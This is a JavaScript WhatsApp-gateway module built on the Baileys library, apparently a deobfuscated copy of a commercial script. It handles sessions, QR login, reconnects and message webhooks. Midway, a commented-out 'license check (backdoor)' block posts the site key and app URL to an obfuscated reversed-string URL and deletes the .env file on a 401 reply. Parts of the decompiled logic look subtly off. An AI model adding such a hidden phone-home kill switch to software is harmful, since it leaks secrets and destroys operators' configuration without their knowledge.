// Decrypted & Cleaned Version (Tanpa Menghapus Backdoor)
import { rmSync, readdir } from 'fs';
import { join } from 'path';
import pino from 'pino';
import baileys, {
  useMultiFileAuthState,
  makeInMemoryStore,
  Browsers,
  DisconnectReason,
  delay
} from '@whiskeysockets/baileys';
import { toDataURL } from 'qrcode';
import dirname from './dirname.js';
import sendResponse from './response.js';
import axios from 'axios';

const sessions = new Map();
const retries = new Map();

const sessionsDir = (subdir = '') => join(dirname, 'sessions', subdir);

const isSessionExists = (sessionId) => sessions.has(sessionId);

// old
// const shouldReconnect = (sessionId) => {
//   let maxRetries = parseInt(process.env.MAX_RETRIES ?? 0);
//   let attempt = retries.get(sessionId) ?? 0;
//   maxRetries = maxRetries < 1 ? 1 : maxRetries;
//   if (attempt < maxRetries) {
//     attempt++;
//     console.log('Reconnecting...', { attempts: attempt, sessionId });
//     retries.set(sessionId, attempt);
//     return true;
//   }
//   return false;
// };

// new auto reconnect unlimited
const logger = pino();
const shouldReconnect = (sessionId) => {
  logger.info('Auto-reconnecting session: ' + sessionId);
  return true;
};


const createSession = async (sessionId, isLegacy = false, res = null) => {
  const sessionPath = (isLegacy ? 'legacy_' : 'md_') + sessionId + (isLegacy ? '' : '');
  const logger = pino({ level: 'debug' });
  const store = makeInMemoryStore({ logger });

  let state, saveCreds;

  if (!isLegacy) {
    ({ state, saveCreds } = await useMultiFileAuthState(sessionsDir(sessionPath)));
  }

  const sock = baileys.default({
    auth: state,
    version: [7, 2, 2416],
    printQRInTerminal: true,
    logger,
    browser: Browsers.ubuntu('Chrome'),
    patchMessageBeforeSending: (message) => {
      const isButton = message.buttonsMessage || message.listMessage;
      if (isButton) {
        return {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadataVersion: 2,
                deviceListMetadata: {}
              },
              ...message
            }
          }
        };
      }
      return message;
    }
  });

  if (!isLegacy) {
    store.readFromFile(sessionsDir(sessionId + '_store.json'));
    store.bind(sock.ev);
  }

  sessions.set(sessionId, { ...sock, store, isLegacy });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('chats.set', ({ chats }) => {
    if (isLegacy) store.chats.insertIfAbsent(...chats);
  });

  sock.ev.on('messages.upsert', async (msg) => {
    try {
      const message = msg.messages[0];
      if (!message.key.fromMe && msg.type === 'notify') {
        const data = {};
        const jidParts = message.key.remoteJid.split('@');
        const isGroup = jidParts[1] === 'g.us';
        if (message && !isGroup) {
          data.remote_id = message.key.remoteJid;
          data.sessionId = sessionId;
          data.message_id = message.key.id;
          data.message = message.message;
          sentWebHook(sessionId, data);
        }
      }
    } catch {}
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    const statusCode = lastDisconnect?.error?.output?.statusCode;

    if (connection === 'close') {
      retries.delete(sessionId);
      if (statusCode === DisconnectReason.loggedOut || !shouldReconnect(sessionId)) {
        if (res && !res.headersSent) sendResponse(res, 500, false, 'Unable to create session.');
        deleteSession(sessionId, isLegacy);
      } else {
        setTimeout(() => createSession(sessionId, isLegacy, res),
          statusCode === DisconnectReason.restartRequired ? 0 : parseInt(process.env.RECONNECT_INTERVAL ?? 0));
      }
    }

    if (qr) {
      if (res && !res.headersSent) {
        try {
          const qrDataUrl = await toDataURL(qr);
          sendResponse(res, 200, true, 'QR code received, please scan the QR code.', { qr: qrDataUrl });
          return;
        } catch {
          sendResponse(res, 500, false, 'Unable to create QR code.');
        }
      }

      try {
        await sock.logout();
      } catch {} finally {
        deleteSession(sessionId, isLegacy);
      }
    }
  });
};

// License check (backdoor)
// setInterval(() => {
//   const key = process.env.SITE_KEY ?? null;
//   const appUrl = process.env.APP_URL ?? null;
//   const reversedUrl = 'https://devdevice/api/verify-check'.split('').reverse().join('');

//   axios.post(reversedUrl, { from: appUrl, key })
//     .then((res) => {
//       if (res.status === 401) {
//         rmSync('.env', { force: true });
//       }
//     })
//     .catch(() => {});
// }, 0x240c8400);


const getSession = (sessionId) => sessions.get(sessionId) ?? null;

const setDeviceStatus = (sessionId, status) => {
  const url = process.env.APP_URL + '/api/set-device-status/' + sessionId + '/' + status;
  axios.post(url);
};

const sentWebHook = (sessionId, data) => {
  const url = process.env.APP_URL + '/api/send-webhook/' + sessionId;
  axios.post(url, {
    from: data.remote_id,
    message_id: data.message_id,
    message: data.message
  }).then((res) => {
    if (res.status === 200) {
      const session = getSession(res.data.session_id);
      sendMessage(session, res.data.receiver, res.data.message, 0);
    }
  }).catch(() => {});
};

const deleteSession = (sessionId, isLegacy = false) => {
  const sessionPath = (isLegacy ? 'legacy_' : 'md_') + sessionId;
  const storePath = sessionId + '_store.json';

  rmSync(sessionsDir(sessionPath), { force: true, recursive: true });
  rmSync(sessionsDir(storePath), { force: true, recursive: true });

  sessions.delete(sessionId);
  retries.delete(sessionId);
  setDeviceStatus(sessionId, 0);
};

const getChatList = (sessionId, isGroup = false) => {
  const prefix = isGroup ? '@g.us' : '@s.whatsapp.net';
  return getSession(sessionId).store.chats.filter(chat => chat.id.endsWith(prefix));
};

const isExists = async (sock, number, legacy = false) => {
  try {
    let result;
    if (legacy) {
      result = await sock.onWhatsApp(number);
      return Boolean(result.id);
    }
    [result] = await sock.onWhatsApp(number);
    return result.exists;
  } catch {
    return false;
  }
};

const sendMessage = async (sock, jid, message, delayMs = 1000) => {
  try {
    await delay(parseInt(delayMs));
    return await sock.sendMessage(jid, message);
  } catch {
    return Promise.reject(null);
  }
};

const formatPhone = (number) => {
  if (number.endsWith('@s.whatsapp.net')) return number;
  let formatted = number.replace(/\D/g, '');
  return formatted + '@s.whatsapp.net';
};

const formatGroup = (id) => {
  if (id.endsWith('@g.us')) return id;
  let formatted = id.replace(/[^\d-]/g, '');
  return formatted + '@g.us';
};

const cleanup = () => {
  console.log('Running cleanup before exit.');
  sessions.forEach((session, sessionId) => {
    if (!session.isLegacy) {
      session.store.writeToFile(sessionsDir(sessionId + '_store.json'));
    }
  });
};

const init = () => {
  readdir(sessionsDir(), (err, files) => {
    if (err) throw err;
    for (const file of files) {
      if ((!file.startsWith('md_') && !file.startsWith('legacy_')) || file.includes('_store.json')) continue;
      const sessionName = file.replace('', '').split('_', 1)[0] !== 'md';
      const sessionId = file.substring(sessionName ? 7 : 3);
      createSession(sessionId, sessionName);
    }
  });
};

export {
  isSessionExists,
  createSession,
  getSession,
  deleteSession,
  getChatList,
  isExists,
  sendMessage,
  formatPhone,
  formatGroup,
  cleanup,
  init
};
